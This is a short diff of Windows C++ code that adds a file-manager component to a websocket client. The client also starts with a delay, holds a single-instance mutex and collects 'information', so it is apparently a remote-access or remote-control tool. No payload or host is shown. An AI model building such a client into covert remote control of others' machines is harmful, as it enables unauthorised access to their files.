@@ -89,6 +89,7 @@ void closeSockets(){
 }
 
 typedef websocketpp::client<websocketpp::config::asio_client> client;
+
 int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
@@ -102,6 +103,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
 
         ClientSocket clientSocket(uri, actionMap);
         Information information(clientSocket);
+        FileManager fileManager(clientSocket);
         clientSocket.startConnection();
 
 
